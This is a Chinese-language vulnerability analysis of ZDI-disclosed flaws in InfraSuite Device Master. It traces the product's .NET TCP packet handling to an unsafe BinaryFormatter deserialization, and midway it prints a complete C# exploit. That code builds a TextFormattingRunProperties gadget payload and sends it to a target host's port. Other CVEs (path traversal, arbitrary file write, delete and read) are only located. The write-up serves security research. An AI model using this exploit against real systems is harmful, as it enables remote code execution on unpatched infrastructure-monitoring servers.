对ZDI公布的InfraSuite Device Master⼀揽⼦漏洞的分析.md
2022/11/8
1 / 15
author: Y4er
前⾔
看到zdi发了⼀堆洞，有反序列化、⽬录穿越、权限绕过等等，还是dotnet的，于是有了此⽂。
基础架构
exe对应端⼝
C:\Program Files\InfraSuite Device Master\Device-DataCollect\Device-DataCollect.exe 3000
C:\Program Files\InfraSuite Device Master\Device-Gateway\Device-Gateway.exe 3100 3110
C:\Program Files\InfraSuite Device Master\Device-Gateway\Device-Gateway.exe 80 443
CVE-2022-41778
https://www.zerodayinitiative.com/advisories/ZDI-22-1478/
这个漏洞在3100和3110端⼝
从TCP服务器到业务处理的逻辑如下
对ZDI公布的InfraSuite Device Master⼀揽⼦漏洞的分析.md
2022/11/8
2 / 15
StartGatewayOperation中设置了⽹关服务的⼀些配置
初始化TCP端⼝
监听IPv4 v6，端⼝DEFAULT_TCP_PORT
对ZDI公布的InfraSuite Device Master⼀揽⼦漏洞的分析.md
2022/11/8
3 / 15
this.InitialWebEngine()中配置了web服务器
在StartControlLayer中起worker线程跑业务逻辑
对ZDI公布的InfraSuite Device Master⼀揽⼦漏洞的分析.md
2022/11/8
4 / 15
也就是MainLoop
在DoUpperLayerNWPacket中根据PacketData的sHeader字段的i32PayloadType进⾏switch case。
随便进⼊⼀个case
对ZDI公布的InfraSuite Device Master⼀揽⼦漏洞的分析.md
2022/11/8
5 / 15
看到 Serialization.DeSerializeBinary(sPacket.payload, out obj)
直接binaryformatter，没啥好说的。关键点在于怎么构造payload。
构造payload
构造需要研究其tcp的处理逻辑，在ControlLayerMngt的构造函数中
初始化了⼀个TCPServerConnectionMngt，在ModuleInitialization中定义了TCP链接的send和receive事件。
对ZDI公布的InfraSuite Device Master⼀揽⼦漏洞的分析.md
2022/11/8
6 / 15
我们发送给server的请求是receive事件，被ReceiveCallBack处理。
分别进⾏add、check操作
在add中将传⼊的buffer赋予⾃身this._gRxPacketBytesBuffer，变⻓存储字节数据。
对ZDI公布的InfraSuite Device Master⼀揽⼦漏洞的分析.md
2022/11/8
7 / 15
check中检查数据包格式，重组PacketData对象
并调⽤this.AddRxPacket(packetData)将重组的packet对象加⼊this._gRxPacketList
对ZDI公布的InfraSuite Device Master⼀揽⼦漏洞的分析.md
2022/11/8
8 / 15
回看MainLoop
this.CheckUpperLayerNWPacket();
this.DoUpperLayerNWPacket();
Check调⽤ReceivePacket判断this._gRxPacketList中是否有数据包
对ZDI公布的InfraSuite Device Master⼀揽⼦漏洞的分析.md
2022/11/8
9 / 15
ReceivePacket调⽤GetFirstRxPacket拿到第⼀个数据包packet
然后调⽤this._gUpperLayerNWPacketQueue.AddToSyncQueue(packetData)将数据包加⼊到同步队列中。
DoUpperLayerNWPacket就是拿到队列中的第⼀个数据包
对ZDI公布的InfraSuite Device Master⼀揽⼦漏洞的分析.md
2022/11/8
10 / 15
到这⾥的话就随便进⼊⼀个case，拿CtrlLayerNWCmd_FileOperation举例
将PacketData的payload字段反序列化回来，转为CtrlLayerNWCommand_FileOperation业务对象从⽽进⾏下
⼀步业务处理。
那么到此，我们基本明⽩了其架构。
对ZDI公布的InfraSuite Device Master⼀揽⼦漏洞的分析.md
2022/11/8
11 / 15
那么写EXP完全照搬就⾏了。
using InfraSuiteManager.Common; 
using System; 
using System.IO; 
using System.Runtime.Serialization; 
using Microsoft.VisualStudio.Text.Formatting; 
using System.Net.Sockets; 
namespace ConsoleApp1 
{ 
    internal class Program 
    { 
        [Serializable] 
        public class TextFormattingRunPropertiesMarshal : ISerializable 
        { 
            protected TextFormattingRunPropertiesMarshal(SerializationInfo 
info, StreamingContext context) 
            { 
            } 
            string _xaml; 
            public void GetObjectData(SerializationInfo info, 
StreamingContext context) 
            { 
                Type typeTFRP = typeof(TextFormattingRunProperties); 
                info.SetType(typeTFRP); 
                info.AddValue("ForegroundBrush", _xaml); 
            } 
            public TextFormattingRunPropertiesMarshal(string xaml) 
            { 
                _xaml = xaml; 
            } 
        } 
        static void Main(string[] args) 
        { 
            string xaml_payload = File.ReadAllText(@"1.txt"); 
对ZDI公布的InfraSuite Device Master⼀揽⼦漏洞的分析.md
2022/11/8
12 / 15
            TextFormattingRunPropertiesMarshal payload = new 
TextFormattingRunPropertiesMarshal(xaml_payload); 
            PacketData packet = new PacketData(); 
            PacketOperation packetOperation = new PacketOperation(); 
            if (!Serialization.SerializeBinary(payload, out 
packet.payload)) 
            { 
                Console.WriteLine("serialize error."); 
            } 
            packet.sHeader.i32PayloadSize = packet.payload.Length; 
            byte[] byTxPacket; 
            packetOperation.MakePacketBytes(packet, out byTxPacket); 
            TcpClient tcpClient = new TcpClient("172.16.9.136", 3000); 
            NetworkStream stream = tcpClient.GetStream(); 
            var b = new BinaryWriter(stream); 
            b.Write(byTxPacket); 
            stream.Close(); 
            tcpClient.Close(); 
            Console.WriteLine("done."); 
            Console.ReadKey(); 
        } 
    } 
} 
对ZDI公布的InfraSuite Device Master⼀揽⼦漏洞的分析.md
2022/11/8
13 / 15
对于Device-DataCollect 根据packetData.sHeader.i32PayloadType可以case到1
InfraSuiteManager.DataCollectionLayer.DataCollectionLayerMngt.DCLNWCmd_DCServerS
tatus(ref PacketData) 这个地⽅有反序列化
构造payload不写了，Device-DataCollect和Device-Gateway架构差不多。同样⽤PacketOperation构造
packet数据包就⾏了。
其他的洞就是case不⼀样，以下就只写漏洞点所在了。
CVE-2022-41657
InfraSuiteManager.ControlLayer.ControlLayerMngt.CtrlLayerNWCmd_FileOperation(ref PacketData)
对ZDI公布的InfraSuite Device Master⼀揽⼦漏洞的分析.md
2022/11/8
14 / 15
fileName参数可控导致跨⽬录任意⽂件写⼊+任意⽂件删除
fileName参数导致任意⽂件读取
CVE-2022-41772
没看出来，感觉是解压⽬录穿越
对ZDI公布的InfraSuite Device Master⼀揽⼦漏洞的分析.md
2022/11/8
15 / 15
CVE-2022-41688
CVE-2022-40202
总结
很经典的dotnet tcp server的漏洞，尤其是server对于tcp packet的处理和业务逻辑的关联梳理，让我对
dotnet的理解更进⼀步。